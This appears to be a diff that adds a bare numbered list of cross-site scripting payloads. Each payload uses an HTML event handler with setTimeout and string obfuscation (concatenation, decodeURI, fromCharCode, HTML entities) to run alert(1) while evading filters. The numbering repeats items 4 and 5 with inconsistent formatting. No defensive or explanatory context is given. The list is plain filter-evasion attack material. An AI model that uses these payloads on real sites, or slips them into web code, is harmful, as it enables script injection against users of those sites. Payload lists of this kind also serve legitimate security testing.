@@ -1,0 +1,10 @@
+1. `<img src=x onerror=setTimeout(Function('ale'+'rt(1)'),100)>`
+2. `<input autofocus onfocus=setTimeout(decodeURI('%61lert(1)'),100)>`
+3. `<marquee onstart=setTimeout(()=>'ale'+'rt(1)',100)></marquee>`
+4. `<object data=data:text/html,<body onload=setTimeout(()=>{al%65rt(1)},100)></object>`
+5. `<video><source onerror=setTimeout(Function('al'+'ert(1)'),100)></video>`
+4. <img src=x onerror=setTimeout('al'+'ert&#40;1&#41;',100)>
+5. <marquee loop=1 onfinish=setTimeout(decodeURI('%61%6c%65%72t(1)'),100)></marquee>
+6. <object data="data:text/html,<body onload=setTimeout('a'+'lert(1)',100)></body>"></object>
+7. <audio src onloadstart=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),100)></audio>
+8. <form><button formaction="javascript:setTimeout('ale'+'rt(1)',100)">Click</button></form>
